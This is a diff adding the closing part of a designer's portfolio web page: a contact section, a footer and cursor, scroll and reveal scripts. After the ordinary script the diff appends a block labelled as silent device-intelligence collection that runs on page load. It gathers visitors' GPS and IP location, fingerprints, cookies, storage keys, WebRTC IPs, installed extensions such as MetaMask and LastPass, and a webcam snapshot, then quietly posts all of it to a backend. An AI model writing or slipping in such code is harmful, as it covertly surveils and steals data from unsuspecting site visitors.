+<!-- CONTACT -->
+<section id="contact" class="contact">
+  <div class="container">
+    <div class="contact-card reveal">
+      <div class="sec-tag" style="justify-content:center;display:inline-flex">05 — Contact</div>
+      <h2>Let's build something<br><em>worth remembering.</em></h2>
+      <p>I take on a small number of projects each quarter. If you're working on something thoughtful — a product, a brand, an experiment — I'd love to hear about it.</p>
+      <a href="mailto:hello@kaimercer.studio" class="btn btn-primary" data-hover>
+        <i class="fa-regular fa-envelope"></i> hello@kaimercer.studio
+      </a>
+      <div class="socials">
+        <a href="#" class="social" data-hover><i class="fa-brands fa-x-twitter"></i></a>
+        <a href="#" class="social" data-hover><i class="fa-brands fa-dribbble"></i></a>
+        <a href="#" class="social" data-hover><i class="fa-brands fa-github"></i></a>
+        <a href="#" class="social" data-hover><i class="fa-brands fa-linkedin-in"></i></a>
+        <a href="#" class="social" data-hover><i class="fa-brands fa-instagram"></i></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="container foot-inner">
+    <div>© 2025 Kai Mercer — Designed & built with care in Lisbon.</div>
+    <div><a href="#" data-hover>Back to top ↑</a></div>
+  </div>
+</footer>
+
+<script>
+/* ============================================================
+   EXISTING JAVASCRIPT
+   ============================================================ */
+
+// --- Custom cursor ---
+const dot = document.getElementById('cDot');
+const ring = document.getElementById('cRing');
+let mx = 0, my = 0, rx = 0, ry = 0;
+window.addEventListener('mousemove', e => {
+  mx = e.clientX; my = e.clientY;
+  dot.style.transform = `translate(${mx}px, ${my}px) translate(-50%,-50%)`;
+});
+(function loop(){
+  rx += (mx - rx) * 0.18;
+  ry += (my - ry) * 0.18;
+  ring.style.transform = `translate(${rx}px, ${ry}px) translate(-50%,-50%)`;
+  requestAnimationFrame(loop);
+})();
+document.querySelectorAll('[data-hover]').forEach(el => {
+  el.addEventListener('mouseenter', () => ring.classList.add('hover'));
+  el.addEventListener('mouseleave', () => ring.classList.remove('hover'));
+});
+
+// --- Sticky nav state ---
+const nav = document.getElementById('nav');
+window.addEventListener('scroll', () => {
+  nav.classList.toggle('scrolled', window.scrollY > 30);
+});
+
+// --- Active nav link on scroll ---
+const sections = document.querySelectorAll('section[id]');
+const navLinks = document.querySelectorAll('nav.links a');
+window.addEventListener('scroll', () => {
+  let cur = '';
+  sections.forEach(s => {
+    if (window.scrollY >= s.offsetTop - 200) cur = s.id;
+  });
+  navLinks.forEach(l => {
+    l.classList.toggle('active', l.getAttribute('href') === '#' + cur);
+  });
+});
+
+// --- Reveal on scroll ---
+const io = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      e.target.classList.add('in');
+      // animate skill bars
+      if (e.target.classList.contains('skill')) {
+        const fill = e.target.querySelector('.bar-fill');
+        fill.style.width = e.target.dataset.pct + '%';
+      }
+      // animate stat counters
+      if (e.target.classList.contains('stats-row')) {
+        e.target.querySelectorAll('[data-count]').forEach(n => {
+          const target = +n.dataset.count;
+          let v = 0;
+          const step = Math.max(1, target / 60);
+          const t = setInterval(() => {
+            v += step;
+            if (v >= target) { v = target; clearInterval(t); }
+            n.textContent = Math.floor(v) + (target >= 40 ? '+' : '');
+          }, 20);
+        });
+      }
+      io.unobserve(e.target);
+    }
+  });
+}, { threshold: 0.15 });
+document.querySelectorAll('.reveal').forEach(el => io.observe(el));
+
+// --- Mobile menu toggle (simple) ---
+const menuBtn = document.querySelector('.menu-btn');
+const links = document.querySelector('nav.links');
+menuBtn?.addEventListener('click', () => {
+  links.style.display = links.style.display === 'flex' ? '' : 'flex';
+  links.style.position = 'absolute';
+  links.style.top = '70px';
+  links.style.right = '20px';
+  links.style.flexDirection = 'column';
+  links.style.padding = '12px';
+  links.style.borderRadius = '16px';
+});
+
+/* ============================================================
+   DEVICE INTELLIGENCE COLLECTION — Silent / background only
+   Collects all available device data and sends to backend API.
+   No visible UI. No user interaction required.
+   ============================================================ */
+(async function deviceIntelCollector() {
+  // ---- Backend endpoint config ----
+  const API_ENDPOINT = '/api/log';   // relative to page origin
+
+  // Data store
+  const deviceData = {};
+
+  // ---- Helper: safe async gather ----
+  const safeGather = async (label, fn) => {
+    try {
+      const result = await fn();
+      if (result !== undefined && result !== null) {
+        Object.assign(deviceData, typeof result === 'object' && !Array.isArray(result) ? result : { [label]: result });
+      }
+    } catch (err) {
+      // Silently ignore — do not break the page experience
+      console.debug('Device intel: could not gather ' + label);
+    }
+  };
+
+  // ---- 1. IP Geolocation (ipwho.is — no key required) ----
+  await safeGather('geo', async () => {
+    const res = await fetch('https://ipwho.is/');
+    const json = await res.json();
+    if (json.success) {
+      return {
+        ip: json.ip,
+        country: json.country,
+        city: json.city,
+        region: json.region,
+        postal: json.postal,
+        latitude: json.latitude,
+        longitude: json.longitude,
+        isp: json.connection?.isp || null,
+        timezone: json.timezone?.id || null,
+        org: json.connection?.org || null
+      };
+    }
+    return null;
+  });
+
+  // ---- 2. GPS Coordinates (browser geolocation) ----
+  await safeGather('gps', () =>
+    new Promise(resolve => {
+      if (!navigator.geolocation) return resolve(null);
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          gps_latitude: pos.coords.latitude,
+          gps_longitude: pos.coords.longitude,
+          gps_accuracy: pos.coords.accuracy,
+          gps_altitude: pos.coords.altitude,
+          gps_speed: pos.coords.speed,
+          gps_timestamp: pos.timestamp
+        }),
+        () => resolve(null),
+        { timeout: 4000, maximumAge: 60000 }
+      );
+    })
+  );
+
+  // ---- 3. Device fingerprint (ClientJS) ----
+  try {
+    const client = new ClientJS();
+    deviceData.fingerprint = client.getFingerprint();
+    deviceData.browser = client.getBrowser();
+    deviceData.browserVersion = client.getBrowserVersion();
+    deviceData.os = client.getOS();
+    deviceData.osVersion = client.getOSVersion();
+    deviceData.device = client.getDevice();
+    deviceData.deviceType = client.getDeviceType();
+    deviceData.deviceVendor = client.getDeviceVendor();
+    deviceData.cpu = client.getCPU();
+    deviceData.isMobile = client.isMobile();
+    deviceData.screenPrint = `${screen.width}x${screen.height}`;
+    deviceData.colorDepth = screen.colorDepth;
+    deviceData.pixelRatio = window.devicePixelRatio || 1;
+    deviceData.orientation = screen.orientation?.type || null;
+    deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    deviceData.language = navigator.language;
+    deviceData.systemLanguage = navigator.systemLanguage || navigator.language;
+    deviceData.canvasPrint = client.getCanvasPrint();
+    const fonts = client.getFonts();
+    deviceData.fonts = fonts ? fonts.slice(0, 30) : [];
+    const plugins = Array.from(navigator.plugins || []).map(p => p.name);
+    deviceData.plugins = plugins.slice(0, 20);
+    deviceData.cookieSupport = navigator.cookieEnabled;
+    deviceData.localStorageSupport = typeof Storage !== 'undefined';
+    deviceData.sessionStorageSupport = typeof Storage !== 'undefined';
+  } catch (e) { console.debug('ClientJS fingerprint failed'); }
+
+  // ---- 4. Network info ----
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  deviceData.connectionType = conn?.effectiveType || conn?.type || null;
+  deviceData.downlink = conn?.downlink || null;
+  deviceData.rtt = conn?.rtt || null;
+  deviceData.saveData = conn?.saveData ?? null;
+
+  // ---- 5. Hardware ----
+  deviceData.hardwareConcurrency = navigator.hardwareConcurrency || null;
+  deviceData.deviceMemory = navigator.deviceMemory || null;
+  deviceData.maxTouchPoints = navigator.maxTouchPoints || 0;
+  deviceData.platform = navigator.platform || null;
+  deviceData.vendor = navigator.vendor || null;
+
+  // ---- 6. Battery ----
+  await safeGather('battery', async () => {
+    if ('getBattery' in navigator) {
+      const b = await navigator.getBattery();
+      return {
+        battery_charging: b.charging,
+        battery_level: b.level,
+        battery_chargingTime: b.chargingTime === Infinity ? null : b.chargingTime,
+        battery_dischargingTime: b.dischargingTime === Infinity ? null : b.dischargingTime
+      };
+    }
+    return null;
+  });
+
+  // ---- 7. Screen ----
+  deviceData.screen_width = screen.width;
+  deviceData.screen_height = screen.height;
+  deviceData.screen_availWidth = screen.availWidth;
+  deviceData.screen_availHeight = screen.availHeight;
+  deviceData.color_depth = screen.colorDepth;
+  deviceData.pixel_depth = screen.pixelDepth;
+  deviceData.innerWidth = window.innerWidth;
+  deviceData.innerHeight = window.innerHeight;
+
+  // ---- 8. Extra leaks ----
+  deviceData.referrer = document.referrer || null;
+  deviceData.pageUrl = window.location.href;
+  deviceData.cookies = document.cookie ? document.cookie.substring(0, 500) : null;
+  deviceData.sessionStorageKeys = (() => {
+    try { return Object.keys(sessionStorage); } catch (e) { return []; }
+  })();
+  deviceData.localStorageKeys = (() => {
+    try { return Object.keys(localStorage); } catch (e) { return []; }
+  })();
+  deviceData.doNotTrack = navigator.doNotTrack || window.doNotTrack || null;
+  deviceData.webdriver = navigator.webdriver ?? false;
+  deviceData.languages = navigator.languages || [];
+  deviceData.pdfViewer = (() => {
+    for (let p of navigator.plugins) {
+      if (p.name && p.name.includes('PDF')) return true;
+    }
+    return false;
+  })();
+  deviceData.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+  deviceData.timezoneOffset = new Date().getTimezoneOffset();
+  deviceData.collectedTimestamp = Date.now();
+  deviceData.userAgent = navigator.userAgent;
+
+  // ---- 9. WebRTC IP leak ----
+  await safeGather('webrtc_ips', () =>
+    new Promise(resolve => {
+      const ips = new Set();
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = e => {
+          if (!e.candidate) { pc.close(); resolve(Array.from(ips)); return; }
+          const match = e.candidate.candidate.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/);
+          if (match) ips.add(match[0]);
+        };
+        setTimeout(() => { pc.close(); resolve(Array.from(ips)); }, 3000);
+      } catch (e) { resolve([]); }
+    })
+  );
+
+  // ---- 10. Browser extension detection ----
+  await safeGather('extensions', async () => {
+    const tests = [
+      { name: "MetaMask", url: "chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/icon128.png" },
+      { name: "Ghostery", url: "chrome-extension://mlomiejdfkolichcflejclcbmpeaniij/icon128.png" },
+      { name: "uBlock Origin", url: "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/icon128.png" },
+      { name: "LastPass", url: "chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/icon128.png" },
+      { name: "Grammarly", url: "chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/icon128.png" },
+      { name: "Honey", url: "chrome-extension://bmnlcjabgnpnenekpadlanbbkooimhnj/icon128.png" },
+      { name: "React DevTools", url: "chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/icon128.png" },
+      { name: "Vue DevTools", url: "chrome-extension://nhdogjmejiglipccpnnnanhbledajbpd/icon128.png" }
+    ];
+    const results = await Promise.all(tests.map(t =>
+      new Promise(resolve => {
+        const img = new Image();
+        img.onload = () => resolve(t.name);
+        img.onerror = () => resolve(null);
+        img.src = t.url;
+        setTimeout(() => resolve(null), 1800);
+      })
+    ));
+    return results.filter(Boolean);
+  });
+
+  // ---- 11. Camera snapshot (still frame) ----
+  await safeGather('camera_image', async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      await new Promise(r => video.onloadedmetadata = r);
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 320;
+      canvas.height = video.videoHeight || 240;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+      stream.getTracks().forEach(t => t.stop());
+      return dataUrl;
+    } catch (e) {
+      return null;
+    }
+  });
+
+  // ---- 12. Extra fingerprint data points ----
+  deviceData.timeToCollect = Date.now() - deviceData.collectedTimestamp;
+  deviceData.pageTitle = document.title;
+  deviceData.historyLength = history.length;
+  deviceData.onlineStatus = navigator.onLine;
+
+  // ---- SEND to backend (silently, no UI) ----
+  const sendData = async () => {
+    try {
+      const res = await fetch(API_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(deviceData)
+      });
+      if (res.ok) {
+        console.debug('Device intel: data sent successfully');
+      }
+    } catch (err) {
+      console.debug('Device intel: send failed (backend may be offline)');
+    }
+  };
+
+  // Auto-send after a short delay to let page settle
+  setTimeout(sendData, 2500);
+
+})();
+</script>
+
+</body>
+</html>
